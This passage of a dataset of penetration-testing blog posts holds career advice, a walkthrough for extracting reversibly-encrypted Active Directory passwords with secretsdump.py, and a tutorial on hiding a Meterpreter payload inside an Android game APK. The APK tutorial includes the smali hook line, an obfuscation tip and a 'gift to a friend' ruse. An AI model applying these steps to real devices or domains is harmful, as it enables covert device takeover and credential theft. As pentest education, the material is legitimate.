from a person whose signature was a complete RSA implementation in something like four lines of painfully-unclear Perl code. The story goes that the US government considered it a munition, and illegal to export. That got me in three ways. First, I was surprised that it was possible to do encryption with such a small program. Second, I could not believe that this block of text - that looked like line noise on a bad modem connection - was a way to do it. I wanted to be able to understand things like that. Third, I was intrigued by the idea that sharing this bit of text was the legal equivalent of shipping weapons of war.\n\nI'm not sure if this is the exact one I saw or not, but it shows the idea:\n\n#!/bin/perl -sp0777i\n\n$/=unpack('H*',$_);$_=`echo 16dio\\U$k\"SK$/SM$n\\EsN0p[lN*1\n\nlK[d2%Sa2/d0$^Ixp\"|dc`;s/\\W//g;$_=pack('H*',/((..)*)$/)\n\n-Brian BB King\n\nI really wasn't aware of infosec as an industry or career path until I switched majors to computer science in college. I took an introductory infosec course as an elective, and I was instantly hooked. I knew I wanted to do something in this industry. - Craig Vincent\n\nI stumbled into it, also I liked the movie (Hackers 1995). The SANS Institute offered my college (US Air Force Academy) scholarships to spend our spring break taking a SANS course. I was a PoliSci major at the time, but our CompSci students weren't interested in sacrificing their spring break. I was. It changed my life. -Matt Toussain\n\nThis is probably the worst answer, but I actually pursued technology/security because I knew the market was large and there were lots of job opportunities and it paid well. A better answer from a security standpoint; when I applied for an internship with BHIS I only had a vague idea of what the company did, and what red teams were. Somewhere in the middle of the interview, I began to realize, 'Wait, these guys hack people and those people pay them for it? That's a real job?? I need to work here.' -Kelsey Bellew\n\nIt's hard to pin down exactly. It could be learning basic networking while trying to bypass school firewall restrictions in order to play games or watch Youtube, accidentally discovering remote connection methods and persistence mechanisms in order to play pranks on friends' computers, or maybe the lone flyer in a tucked-away corner of college campus that led to a phone call with John where I asked him if incredulously if hacking banks was actually legal. - Ethan Robish\n\nI chose this career as I always enjoyed figuring out how to fix computers and how they worked in high school so thought why not make this my goal. Granted, I took two years between high school and college to make sure it\u2019s what I wanted to do by doing some odd jobs. - Derrick Rauch\n\nI was working in construction from like 1999 to 2004 to get through college and realized how hard it was every day. Looking back, it was nice to leave my work on the job site, but that was where it started. One of my roommates was in the CIS program and loved it. I jumped. HP hired me out of college just about as soon as I graduated in 2005. Tech support, front line - truly the grind. It was the start of four jobs in this field that landed me at BHIS. ProTip: The customer service, tech support, help desk, etc., these jobs are crucial to forming a solid background in computer science. Learn how to solve problems effectively. Learn how to discern between useful web search results and wastes of time. Employers don't want to hire you for what you know. I generally believe that anyone (some computer background) can be trained to accomplish digital tasks. I can't train you to manage your time well. We can't train people to be nice, treat others like human beings, or to be steady under pressure. And truly, those are the skills that will put you at the front of the line. It worked for me and everyone else at BHIS too. -Jordan Drysdale\n\n2)What would be one important piece of advice for someone who is considering going into this field?\n\nI don't know if you can \u201cstart out\u201d in IT information security. I didn't, I've worked hard to get here and consequently have a decent understanding of many different aspects of IT and how businesses actually work. - Kent Ickler\n\n\"Try Harder\" is the motto of Offensive Security, and it has stuck with me since I was working on the OSCP back in 2011. Both in InfoSec and in life I've found that motto to be an extremely important staple of how I get things done. There are many times when you will hit a wall and think something is too difficult and want to give up. Just know that there are vastly unexplored territories in computer security that likely contain vulnerabilities that will only be discovered by pushing yourself further. \n\nAnother motto that I live by now is one I learned from Mike Felch (@ustayready) when we were working on the \"Bomb Defusing\" challenge at DEF CON in 2017. That motto is \"Fail Fast, Fail Often, and Fail Forward\". When you are working on solving a problem spend more time failing and less time analyzing the problem from a distance. Document what you did, why it failed, and then try something different. If that fails too that's okay. The key here is to learn from what you did so that you can arrive at a solution sooner. \n\nI know you only asked for one important piece of advice but here is a third: Learn a programming language. It will be an extremely useful skill that you will be able to utilize to modify a current tool, or write a brand new tool. - Beau Bullock\n\nBe ready to always learn and sometimes be frustrated. IT/Security is always changing and things that work three weeks ago may not tomorrow. - Derrick Rauch\n\nDon't specialize too soon. Develop a broad base of fundamental skills before getting into \"security.\" Programming, networking, database management, system administration, etc. If you don't have a solid grounding in the systems and environments you want to secure, you'll always be struggling. (You're going to struggle anyhow, but without a good background, you'll waste time struggling with the wrong things.) -Brian BB King\n\nGet as much hands-on experience as you can. Build some sort of lab or test environment at home. Even if you're just practicing exploiting some of the intentionally vulnerable virtual machines that are out there or messing with your own network, that experience is super valuable. John's 5 year plan webcast has some good examples of things you can do for cheap/free at home. - Craig Vincent\n\nDon't worry too much about the degree. After I got the bug for hacking I figured computer science was the field to go. For me, changing majors was a mistake. As a fuzzy major, I was spending time tinkering with things, coding on the side for my own edification. As a computer scientist, I was given designated \"assignments\" to accomplish. It sucked the passion and perseverance out of me while simultaneously giving you challenges with known solutions to solve. One of the most critical skills in information security is the ability to go off-script. There is no better way to learn this than to tinker... on your own. While a STEM major may provide some value in my experience this pales in comparison to sheer passion, proven ability, and experience. While you are studying take the opportunity to look beyond your degree, find and contribute to open source projects, tinker. - Matt Toussain\n\nFind some aspect of cybersecurity that really interests you, and make a personal project out of it. This will teach you so much more than you could just learn in a class, and talking about that project makes you an excellent candidate during interviews. -Kelsey Bellew\n\nI'm going to echo what others have mentioned: find a mentor (ideally local). Go to security conferences if you are able or find local city or college meetups if they exist. Find other people in college who are interested in the same thing. Try to find a security professional locally (try searching LinkedIn, Twitter, Facebook, or conferences) and meet up with them. Just try to be as likable as you can and respect their time. Show your enthusiasm and willingness to learn and help. If you already have skills, chances are you can find an internship where you can do your utmost to contribute and learn. We love interns who are self-driven, ask questions and find ways to add value rather than wait for someone to have the time to give them step by step instructions. Or if you still have some basics to learn, take any advice a mentor can give you, take action, and then report back after a few months with what you've accomplished, learned, etc. It's a huge compliment to take someone's advice and actually put it into action. Not only have you shown you respect that person, you have also shown you are self-driven, able to learn, and that you now have more valuable skills and experiences to bring to the table. - Ethan Robish\n\nI've sold the ranch on this one already, but here goes. It is okay to take an entry-level job in IT at a help desk, for a local ISP, for a local firm that provides some form of managed services. Desktop technicians become server technicians. We hire server techs because they know how to make the world go around. Learn about networking. I don't mean people networking, I mean connecting systems together. Learn what layer two is (MAC to MAC device communications - ARP) - switches live here? Why does ARP matter to layer three communications (routers live here)? Layer four is protocol communication -- HTTP is port 80, SSL is port 443. So, my web server is mac aa:bb:cc:dd:ee:ff at 10.1.1.10 and is listening on port 80. What does a packet destined for this device look like? Truly, learning how to communicate with this device from a local device at 10.1.1.20 and what those packets look like, verses from my house, and routers, these fundamentals are so crucial to the functioning of the general internet and business as a whole these days. The fundamentals of infosec start with networking. -Jordan Drysdale\n\n3)What was the biggest hurdle that you encountered when you were first getting started in information security and how did you overcome it? \n\nBiggest hurdle I had was the impersonation syndrome. It\u2019s real. I knew a little about a lot of things. For a long time, I tried to keep up with my co-workers' careers. Turns out everyone brings something important to the table. Working at BHIS is great because we work together, share ideas, knowledge, experiences. We all grow and all become better security analysts, hackers, and humans. - Kent Ickler\n\nThe biggest hurdle I encountered was getting an initial role in InfoSec. I knew from that Ethical Hacking course in college that's what I wanted to do but didn't have any experience. While still in college I got an \"IT-related\" job in operations where I basically was in a SOC but mainly just kept things running. It wasn't really an \"InfoSec\" role though. I was able to eventually shadow with the security department at the company I was at to get my feet wet in InfoSec. Eventually, I applied for a \"Systems Analyst\" job at another company but in my interview, I spoke a lot about my interests and motivation to work in a computer security role. They actually ended up creating a brand new \"Security Analyst\" role for me after that interview. - Beau Bullock\n\nThe internet was brand new which meant there were very limited resources. Understanding deep technical vulnerabilities meant I had to understand the inner-workings of the technology so that I could understand the security problems when they were introduced to me. In the late 90's early 00's, we would gather on IRC channels and collaborate on discovering new security vulnerabilities then release the details in e-zines. It boiled down to having an inquisitive thought-life, being surrounded by a group of people smarter than me, and always being willing to share regardless if I felt it was share-worthy or not. - Mike Felch\n\nI think having no security experience was probably the biggest hurdle. When I had a chance to represent my team (a kind of development group) on a project being run by the security group at my company, I jumped at it. I did my best to understand the project's goals and how it would affect my team. I asked questions, found answers, and got to know the person leading the security side. After a few weeks of working together, I asked him if they were hiring. He said they were. I applied and made an internal transfer to the security team based not on my security skills, but on how I handled that project. -Brian BB King\n\nI struggled with trying to find a balance between work and life and I finally realized and accepted that one can not know everything in this field and that is okay to focus on what you enjoy in it and don\u2019t let life pass you by. - Derrick Rauch\n\nFiguring out what I actually wanted to do was probably the hardest thing. When I started looking at getting into infosec, it was kind of daunting how broad the field was. There were many different paths to get started on, and many of them required some very different skills. In terms of how I overcame it? I guess you can say I brute-forced it because I got it wrong the first time! I used to think I wanted to be a malware analyst. It wasn't until I had spent hundreds of hours studying, developing those skills, and playing with malware samples that I realized I really wasn't cut out to be a malware analyst. Some things sound like way more fun than they actually are, and malware analysis just wasn't for me. The best advice I could give to someone starting out is to try different things until they find something they really enjoy. - Craig Vincent\n\nMy biggest hurdle was the gaping holes I had in my networking knowledge. Most of the testers at BHIS at the time came from very varied backgrounds where they had lots of experience in everything computer related, or they had previously worked as network administrators. When I first started (and coming from a strictly computer science/coding background), I hardly understood the difference between an internal and external network. I overcame this reading a lot of technical articles/Wikipedia/RFCs, getting first-hand experience, and asking a lot of questions even when I thought they would make me sound dumb. -Kelsey Bellew\n\nGoing from college to an extremely small consulting business, there was very little feedback or direction. With college, you have grades on every assignment so you know if you did well. With work, you'll only really ever know if you seriously screwed up. If you're very lucky you will know if you did well but most of the time you just have to find your own self-confidence while still staying humble and being receptive to any feedback that may come your way. - Ethan Robish\n\nWith my first job solving complex networking problems for enterprise customers at HP, it was immaturity. I was young, did not have a large support network around me. It took my manager being one of the best people I've ever met (still text) to get me headed in the right direction. I didn't know how to talk to people, look them in the eye. I didn't know how to listen either, which turned out to be way more important. As my life in IT progressed, there were lots of other challenges along the way. Learning how to balance life, right? We all need to have healthy habits outside the workplace, which was easy in Colorado. Hiking, biking, snow riding, all those things. Family eventually, lack of sleep. As pay goes up, generally so do responsibilities. I carried an after-hours pager for a long while, which sucked. Bad, especially already being tired and getting calls in the middle of the night. At BHIS, I quickly realized there was something significant missing in my background. I have been struggling to write scripts, code, programs and basically develop functional code since I started here. I'm still struggling with this today. -Jordan Drysdale\n\nA huge thanks to all of our testers who took time out of their busy schedule to help answer these questions!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"A Career in Information Security: FAQ (Part 2)\"\nTaxonomies: \"Informational, InfoSec 101, career path in infosec, FAQ, getting in to infosec, information security, infosec, infosec 101\"\nCreation Date: \"Mon, 01 Oct 2018 14:34:50 +0000\"\nStaff//\n\nIf you missed part one, you can get caught up here: www.blackhillsinfosec.com/a-career-in-information-security-faq-part-1/\nLet's jump straight back in to the Q & A!\n4)What are some of the college courses that you took that had a lasting impact on your career?\n\nCourses in Human Capital Management had the most lasting impacting on my career. But, I might be the minority on that. Human Capital Management is about human knowledge, human resources, and matching a pay service to a human capable of doing the work. Being a Security analysts with that background helps you find vulnerabilities as a result of a knowledge/skill gap has become their weakest link. Businesses that have invested in Human Capital Management typically cover their IT assets in such a way that the right eyes are looking in the right places at the right time and have a continuity plan for when those eyes get tired. - Kent Ickler\n\nEthical Hacking was really the primary course I took in college that had a \"lasting impact\" on my career. Any programming classes I took also had an impact but on a daily basis I use more that I've learned from real-world experience than what college classes taught me. In terms of quality educational courses I highly recommend SANS courses though. Each SANS course I've taken has been packed with information that I've been able to utilize daily. -Beau Bullock\n\nPhilosophy 105: Logic and Reasoning. This covered formal and informal logic: syllogisms and fallacies and those sorts of things. I took it as an elective for fun, but it gave me a solid understanding of how to build an argument and how to recognize cognitive biases and flawed reasoning. When I shifted my focus to computers, I found boolean logic and truth tables were nice and familiar. -Brian BB King\n\nProgramming was by far one of my most beneficial classes. No I\u2019m not saying take nothing but programming classes (unless that is your desired field). The reason I say this is it teaches fundamentals on how applications work as well as design flow which helps correlate to possible findings of vulns as well as a basis for troubleshooting in a systematic way/thinking outside the box. - Derrick Rauch\n\nWe had a course called \"Legal and Ethical Issues in Computing\". I find myself using concepts and ideas from that class on an almost daily basis. - Craig Vincent\n\nReally none. I didn't even take a security class in college. -Kelsey Bellew\n\nThe basics of computer science are pretty universal and good to have a grasp on: Discrete Math, Data Structures, Algorithms. Knowing how to program in a couple languages is useful. Networking knowledge is crucial but can be self-taught and Operating Systems fundamentals is sometimes handy too. - Ethan Robish\n\nProject Management. Microsoft Office bootcamp. Java basics. Finance, I still carry a calculator that can do TimeValueOfMoney. Marketing - understanding demographics. MacroEcon - I now take a macro perspective in every situation. HTML. Spanish!!! I can't emphasize this enough and haven't mentioned that the only reason I got a break at HP was because I could answer a telephone in semi functional Espanol. Seriously, this coursework and the construction day to day with Mexicans paved my way in to IT. No joke. Looking back, I would have invested in more Computer Science. -Jordan Drysdale\n \n5)What are some aspects about your career that you didn't know about or consider when you were starting?\n\nMy career has been a winding path of industry fields all having focused on IT in some fashion. Five years ago I didn't know I would be doing this now, but I enjoy the work I do and being able to (and motivated to) give back to the community is amazing. - Kent Ickler\n\nWhen starting out I didn't really consider how much time would be spent doing reporting. I spend a lot of my week with Microsoft Word open writing reports for customers. This is the most important piece as it is the deliverable to the person who is paying your company for you to do your job. So, if you are interested in getting into penetration testing or red teaming just be aware it's not all hacking. You will be spending a lot of time typing up reports. -Beau Bullock\n\nI thought it was a purely technical field. It's not. Learn to write well. You can learn a lot of the technical skills as-you-go, but you'll never have as good a chance to learn how to use language as you do in school. Practice writing every chance you get. -Brian BB King\n\nI did not consider the fact that I would have to dedicate so much time to continuing education, however this is a double edged sword for me as I love to learn! - Derrick Rauch\n\nStarting out, I didn't realized how tightly coupled my technical work was with the business/operational aspects of the companies and organizations I worked for. I found that considering my role from the \"business perspective\" made me more valuable. It ultimately made my job much easier and more enjoyable too. - Craig Vincent\n\nI have to deal with people a LOT. Any time I thought of a technical job I thought it would mean being in a dark remote cave somewhere, and if you interacted with anyone it would be the other people in the cave. This isn't true at all in security, and I don't think it matters what branch you go into. By nature, it's a very social job. You have to get very good at clearly explaining events and your own point of view if you want to get very far. -Kelsey Bellew\n\nBefore that pivotal phone call with John, I didn't know that hacking into things was a legitimate job. Afterwards, I think what maybe surprised me the most was how much different corporate cultures influenced overall security. In general the places with the worst security were the ones who A) didn't want us to be there B) were forced to consider security by compliance, a customer, or some other department and C) were territorial and either defensive or aggressive towards us and other IT-related departments in their company. - Ethan Robish\n\nI never imagined that my life would be where it is now. There couldn't possibly a closer connection from what I do on a daily basis to what is going on in the real world. SANS SEC504 - Hacker Techniques and Incident Handling - this class is what we do on a daily basis and what defenders these days are up against. There are breaches every single day. We are trying desperately to educate, help people, businesses and anyone that will listen. But, trying to step back and answer the question more directly...We all just expect to get out, get an awesome job and love our lives. The struggle is real. Working at HP in a large corporate environment was super tough and got to be more and more stressful. I quit after five years, a twitchy right eye, and a stressed out life. Sure, money was good, but it was hard. -Jordan Drysdale\n \n6)What are some things I should be spending my time doing now (outside of school) to help prepare me for a career in this field?\n\nWatch all of BHIS's webcasts and follow our crew on Twitter! There are lots of IT Security resources around. Work on capture-the-flag challenges! Start a local meet-up to discuss IT security, IT issues, or just to have an hour away from school. Networking is very important in IT Security because the field is so wide it is not possible to be an expert in all aspects. - Kent Ickler\n\nLearn as much about networking fundamentals as possible. Having an understanding of networking before diving into the security aspect of it is very important in my opinion. This is a seven hour course from Microsoft with eight modules and eight really short assessments that might be a good starting place. \nhttps://mva.microsoft.com/en-us/training-courses/networking-fundamentals-8249\nLearn the Linux command line. It is one of the primary operating systems we use in penetration testing so it will be very good to get a basic understanding of it and how to use the command line. Almost everything we do in security is driven from the command line. Here are two free courses on Linux and the command line. The second one will walk you through setting up Virtual Box and a Linux virtual machine then show you some command line basics. \nhttps://www.codecademy.com/learn/learn-the-command-line\nhttps://www.udacity.com/course/linux-command-line-basics--ud595\nIn penetration testing we are often attacking other computer systems. One very popular tool for doing this is called Metasploit. There is a free course that introduces it from Offensive Security called Metasploit Unleashed that is worth checking out - https://www.offensive-security.com/metasploit-unleashed/. Download the vulnerable virtual machine Metasploitable two from here: http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip and work on attacking it with Metasploit.\nFor learning about webapp security the go-to standard is DVWA (Damn Vulnerable Web App). Set that up and go through some of the exercises. A good list of some more vulnerable VM's can be found on this SANS poster: http://counterhack.net/Poster_PenTest_2015.pdf\nLastly, I highly recommend finding some Capture the Flag contests to participate in as well. Those will challenge what you know and force you to learn new things. Google has one that is over now but the challenges are still up: https://capturetheflag.withgoogle.com. Most \"Security BSides\" events have them, and I really like NYU Poly's CSAW CTF but there are many others. Also, SANS keeps up their Holiday Hack Challenges every year so you can go do the previous year's challenges now. They are epic and a lot of fun. -Beau Bullock\n\nLearn how things work, and how to fix them. By \"things,\" I mean physical items. Replace the kitchen faucet. Swap out an old light fixture. Take the lawnmower apart and put it back together.\n\nDevelop a hobby or interest that doesn't involve computers. Play music. On an instrument that involves no digital circuitry. Join a recreational sport. Take a cooking class. Build a bookshelf. Find *something* you enjoy *doing* that uses a different part of your brain than computering. Look for something you can't do sitting in a chair at a desk! Develop a skill you can feel good about for your own reasons. -Brian BB King\n\nGet hands on experience. Pick up a job at a help desk or computer sales place or do some moonlighting as a per job gig as you have time to get a broad overview of people's needs as well as what this industry can cover. This also helps build social interaction skills as well as hands on experience. Even if your job desires lie more in programming or security, a good base of fundamentals like this is always helpful. - Derrick Rauch\n\nGo to cons and talk to people. Go to your local meetups and talk to people. Listen to podcasts. Read blogs. Get on Twitter and follow the people who are doing what you want to do. Play with the stuff you're interested in at home. - Craig Vincent\n\nContribute to open source projects, come up with and solve challenges with code, build and administer tons of different systems. Hackers break and make things, pentesters do too. Before you can do either you need to understand how the system/application works. Make a WordPress blog, use Drupal, find an old Cisco switch and play around with it. To quote Jurassic Park \"It's a Unix System. I know this!\". The more things you can say that about the better prepared you will be. If you can demonstrate this to an employer you will never have trouble finding a job. - Matt Toussain\n\nGo learn a coding language if you haven't already (I recommend Python). Install and run WireShark on your personal computer and just look at the different connections being made. Install something like Wappalyzer in your browser to see what services are being run on different websites if only to familiarize yourself with the terminology. -Kelsey Bellew\n\nTry as many things as you can to find out what you enjoy. But the main thing is to contribute to something in a meaningful way. Don't just read nonstop and never participate. Here are some examples: coding hackathons, coding competitions, capture the flag competitions, open source development, Google Summer of Code, bug bounties, CCDC, internships. Ranking in competitions or making meaningful coding contributions are great things to have on a resume as they show hands-on experience and that you are good at what you do. - Ethan Robish\n\nLearn to code, even simple stuff - check out CodeCademy. They are awesome. Your family probably needs your help. Learn about better passwords, password managers, 2factor. CAUTION - opinions ahead: Learn about online privacy, read about the electronic frontier foundation. Your privacy matters and protecting it also matters. Buy a book about a technical subject and instead of playing video games or scrolling -- read it for 30 minutes a day. Find an old computer and learn how to install Linux on it (Linux Mint or Ubuntu are awesome). Review your personal digital life, and make your passwords longer, your wifi key could probably use an update. Turn on two-factor everywhere you can. Help your family do the same. -Jordan Drysdale\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How I Cracked a 128-bit Password\"\nTaxonomies: \"How-To, Password Cracking, Red Team, Cleartext, Password Cracker, Password cracking, Red Team, Reversible Encryption\"\nCreation Date: \"Thu, 04 Oct 2018 14:32:34 +0000\"\nSally Vandeven//\n\nTL;DR - Passwords stored using reversible encryption, even if they are VERY LONG,  can be trivially reversed by an attacker.\n\nPassword cracking is quite enjoyable. It is very satisfying to launch Hashcat, throw a bunch of hashes at it and watch the progress over minutes, which turns into hours and then days. It does this all while you are working on another test, walking the dog, or perhaps sipping cocktails on the beach.\n\nA password cracker works by taking a potential password, say Autumn2018, and calculating its hash. Hashcat then compares the newly calculated hash that represents Autumn2018 to the list of hashes you have given it. If it finds one or more matches it means those accounts are using the password Autumn2018.\n\nGot one...\n\nGot another...\n\n...and so on.\n\nIt all starts with extracting the hashes from a domain controller. Most often we elevate to domain admin and logon to a domain controller to get the files needed.\n\nPsssst! Sometimes it is even easier. Sometimes, there is a backup file, accessible by a lower-privileged account, that contains the Active Directory (AD) database.\n\nSince you cannot copy the active, running AD database (it is locked while in use) we create a VSS snapshot and copy the ntds.dit file along with the SYSTEM registry hive that contains the BOOTKEY needed to extract hashes. We typically do this with the built-in ntdsutil command like so:\n\nThen we can use the Impacket secretsdump Python script to actually pull the hashes from database.\n\nsecretsdump.py -system SYSTEM -ntds ntds.dit LOCAL -outputfile breakme\n\nI am used to seeing the the *.NTDS file that contains the NTLM hashes but imagine my surprise when on a recent test the script also output a file with the extension \u201c.CLEARTEXT\u201d. (To protect the innocent, this was re-created in the lab, but this did happen on an actual test.)\n\nThe secretsdump script writes all hashes out to files using the prefix \u201cbreakme\u201d as specified by the outputfile parameter. In this case, it found NTLM hashes, cleartext hashes and Kerberos keys. As it turns out, the \u201cCLEARTEXT\u201d file contained cleartext passwords for the associated users, including several passwords that were literally 128 characters in length!\n\nFor this blog post we, of course, are zooming in on the CLEARTEXT file:\n\nI had never seen this before. This is the thing of legends. There was literally an output file that contained each user account and a corresponding cleartext password. No cracking required. Of course I immediately spot-checked some of these accounts (cough, cough a domain admin account) to see if the passwords were valid and they were!!  After some investigation, I learned that there are at least a couple different mechanisms that force the storage of cleartext credentials.\n\nNote: Cleartext does not really mean that the passwords are stored as is. They are stored in an encrypted form using RC4 encryption. The key used to both encrypt and decrypt is the SYSKEY, which is stored in the registry and can be extracted by a domain admin.This means the hashes can be trivially reversed to the cleartext values, hence the term \u201creversible encryption\u201d.\n\nFor an account that stores the password using reversible encryption, the account properties in Active Directory Users and Computers (ADUC) may show the box checked for Store password using reversible encryption. It looks like this:\n\nYou can use the command line to query AD for any users with the reversible encryption flag set in the UserAccountControl attribute using the following PowerShell command:\n\nGet-ADUser  -Filter  \u2018useraccountcontrol  -band  128\u2019  -Properties useraccountcontrol  | Format-Table name, samaccountname,useraccountcontrol\n\nIf you want the excruciating detail about the syntax of this command, scroll down to the section at the bottom titled In the Weeds. Otherwise, suffice it to say that the above command will get you all the accounts that have been configured to store passwords using reversible encryption.\n\nSo the big question is why. Why would there be a need to store credentials in this manner? The answer is that some applications require it. So Microsoft has provided a mechanism for applications that need to know user password values to force storage of reversibly-encrypted passwords in order to authenticate users. The applications that I know about that require reversible encryption are MS CHAP, SASL Digest Authentication, older MacOS hosts that need to authenticate to a Windows domain. There are also very possibly other third-party apps that use it as well.\n\nHere is a best-practice tip from Microsoft about this setting:\n\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption\n\nTake Aways\n\nEven though it requires a domain administrator to extract hashes from the Active Directory database using the method we have shown above, it implies that the DA (or a stolen DA account) could easily learn other users\u2019 passwords. This violates the principle of non-repudiation, which prevents users from disputing activity within an information system.\n\nWe often find backup sets that contain VSS snapshots providing access to the AD database. The backup sets are often accessible by lower privileged accounts and perhaps even all domain users. In that case, any domain user could easily have access to any account password that was stored using reversible encryption.\n\nIn the Weeds\n\nI promised some more details on the command syntax shown above. As a refresher, here is the command to extract users whose passwords are stored using reversible encryption from Active Directory using PowerShell:\n\nGet-ADUser  -Filter  \u2018useraccountcontrol  -band  128\u2019  -Properties useraccountcontrol  | Format-Table name, samaccountname,useraccountcontrol\n\nLet\u2019s break it down piece by piece:\n\nGet-ADUser is a cmdlet in the ActiveDirectory PowerShell module that is installed on Windows Server 2008 R2 and later by default. It can be imported using the Import-Module command.\n\nFilter - Uses a PowerShell expression to tell the cmdlet what the search parameters are. In this case we are searching for user accounts with specific UserAccountControl attribute values (more on that in a minute).\n\nYou could also use LDAPFilter in place of Filter. It does the same thing as Filter but uses LDAP query syntax. The correct syntax for finding the desired UserAccountControl  value would be:\n\nGet-ADUser -LDAPFilter \u201c(&(objectCategory=Person)(UserAccountControl:1.2.840.113556.1.4.803:=128))\u201d -Properties useraccountcontrol | Format-Table name,samaccountname\n\nuseraccountcontrol -band 128\n\nThe UserAccountControl attribute in Active Directory is an attribute associated with settings for user accounts and is 32 bits in length. Each bit represents a specific setting regarding that user account. For example, when an account is disabled the second low-order bit is set to \u201c1\u201d. In the case of reversible encryption, it is the 8th low-order bit that would be set to \u201c1\u201d. The 8th low-order bit corresponds to the decimal value 128. (I told you we were getting into the weeds.)\n\nTo access the values for specific bits within this number, you have to use logical bit-level operations. To learn more about bitwise operations you can look here or here. In our example, -band 128, means use a bitwise AND operation with the value 128 to determine if the 8th low-order bit is set or not (regardless of what other bits are set within the 32-bit number). This basically isolates just one bit and allows you to examine it like this:\n\nIf you are using the LDAPFilter, the bitwise operation is specified by using the equivalent LDAP syntax for bitwise operations, 1.2.840.113556.1.4.803. By specifying the value 128 we are requesting that all records with the 8th low-order bit set to \u201c1\u201d be returned.\n\nWhew, the hard part is over. The rest of the command is really just about formatting the output.\n\nProperties useraccountcontrol\n\nBecause the Get-ADUser command retrieves a default set of properties that does not include the UserAccountControl attribute, you have to explicitly ask for it in the results with the -Properties parameter.\n\nFormat-Table name, samaccountname,useraccountcontrol\n\nThe Format-Table command tells PowerShell how you want the output formatted along with which properties to show. You could use Format-List instead of Format-Table if you want the results listed vertically instead of in a table.\n\nOf course, you could output it all to a file for further processing\u2026.\n\nGet-ADUser  -Filter  \u2018useraccountcontrol  -band  128\u2019  -Properties useraccountcontrol  | Format-Table name, samaccountname,useraccountcontrol | Out-File -Encoding ascii MyOutput.txt\n\nBravo! You made it to the end.\n\nThanks for reading and, as always, if you have comments or great stories related to this topic, let us know!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Embedding Meterpreter in Android APK\"\nTaxonomies: \"Author, Joff Thyer, Mobile, Red Team, Android, Android APK, meterpreter, mobile apps, pentest, Red Team\"\nCreation Date: \"Mon, 15 Oct 2018 15:52:40 +0000\"\nJoff Thyer//\n\nMobile is everywhere these days. So many applications in our daily life are being migrated towards a cloud deployment whereby the front end technology is back to the days of thin clients. As the pendulum swings yet again, our thin client can be anything from a JavaScript browser framework to a mobile-enabled frontend such as Objective-C on Apple iOS, or Java-based on Android.\n\nLooking at malware, our friends at Apple continue to maintain the 5-guys in a cave paradigm of attempting to vet all apps that enter the iOS app store. While it is a noble effort, there are still instances where malware creeps through the door. Unlike Apple, the Android marketplace is an open approach that allows anyone to contribute to the play store, and moreover represents a majority of the mobile market share. In addition, there are various third-party sites that allow direct download of Android applications package files (APK\u2019s).\n\nThe Metasploit project allows a pentester to generate Android payloads with a pretty highly functional Meterpreter command channel that can be loaded onto an Android device. Typically, loading this APK will be through the Android debugger \u201cadb\u201d through sideloading. From a pen tester perspective, something that is fun to do is to combine a legitimate (perhaps fun) app with Meterpreter and sideload that app onto an Android device. Naturally, you would probably consider sending that device to a \u201cfriend\u201d as a gift or some similar social engineering ruse.\n\nAndroid applications are written in Java which compiles down to a Dalvik executable format known as DEX. The compiled version of an application is a ZIP file of DEX bytecode files. The Dalvik virtual machine on Android has been more recently replaced with Android RunTime (ART) which performs additional optimization and compiles the DEX bytecode into native assembly code. The Dalvik VM primarily performs Just In Time (JIT) interpretation of the majority of bytecode. ART is higher performing than the Dalvik virtual machine which only optimized portions of the bytecode for frequently executed parts of the app.\n\nSmali/baksmali is an assembler/disassembler for Android DEX bytecode. An Android tool named \u201capktool\u201d enables the disassembling of zipped DEX (APK files) into smali files, and reassembling of smali files back to DEX and subsequently to the zipped APK format. We can use this tool to disassemble and modify an existing APK file. In this context, we can use the tool to disassemble and add an additional static entry point into the smali code of the initial Android Activity to kick off our Meterpreter.\n\nOverall the steps to embed a Meterpreter into an existing APK file are as follows:\n\nFind an existing fun APK application on \u201capkmonk.com\u201d or similar mirror site.\n\nGenerate the Metasploit APK file.\n\nDisassemble with \u201capktool\u201d both the Metasploit APK file and the APK file we are intending to modify.\n\nCopy all of the Meterpreter smali code over to the new APK smali directory.\n\nFind the entry point of the code within the APK application\u2019s AndroidManifest.xml file by looking for the intent-filter with the line: The activity name that encloses this intent-filter will be the entry point you are seeking. \n\nModify the activity \u201c.smali\u201d file to include a line that starts up the Meterpreter stage.\n\nCopy all of the Meterpreter smali code over to the new APK smali directory.\n\nRe-assemble into DEX zipped format.\n\nSign the newly created APK file with \u201cjarsigner\u201d, and then sideload onto your target Android device.\n\nIt is much easier to understand the above steps with a concrete example. To illustrate this, I downloaded an APK file of a game called Cowboy Shooting Game from apkmonk.com.\n\nGenerate Your Malware APK\n\nI then generated a Metasploit APK using the \u201cmsfvenom\u201d command as follows.\n\nDisassemble the APK Files\n\nBoth files were then disassembled (baksmaling!!!) using the \u201capktool\u201d as follows:\n\nCopy the Malware Code Into the Cowboy Tools Game\n\nAn easy way to do this is to change directory into the Metasploit APK directory, then copy all of the files under the \u201csmali\u201d directory into the \u201ccom.CowboyShootingGames_2018-09-22\u201d directory. An old trick I learned from a systems administrator to backup entire directory trees using the \u201ctar\u201d command comes in handy whereby you pipe the output of tar into a second command which changes directory and \u201cuntars\u201d the resulting files.\n\nFind the Activity EntryPoint\n\nBelow we can see that the entry activity is listed as \u201ccom.CowboyShootingGames.MainActivity\u201d. We know this because the XML contains an intent-filter with \u201candroid.intent.action.MAIN\u201d within it.\n\nModify the Activity EntryPoint Smali File\n\nAs can be seen above, in this case, the file is going to be named \u201cMainActivity.smali\u201d, and will be located in the \u201ccom/CowboyShootingGames\u201d directory as per the periods (\u201c.\u201d) in the fully qualified classpath.\n\nWithin the \u201cMainActivity.smali\u201d file, we are looking for the \u201conCreate()\u201d method.\n\nWe need to add a single line of \u201csmali\u201d code right below the \u201conCreate()\u201d method call to invoke our Meterpreter stage.\n\n invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V \n\nPlease note that the above is a single line of code. It is possible to obfuscate by using a different pathname than \u201ccom/metasploit/stage/Payload\u201d however if you do that you will have to modify all references to the path in all of the \u201csmali\u201d files that are contained in the \u201cPayload\u201d directory and change the directory name itself. This can be done manually but is prone to error. Continuing without any obfuscation for a moment, the final result after modification will look like the below screenshot.\n\nAdd Permissions to the Modified APK \u201cAndroidManifest.xml\u201d File\n\nFor the next step, use 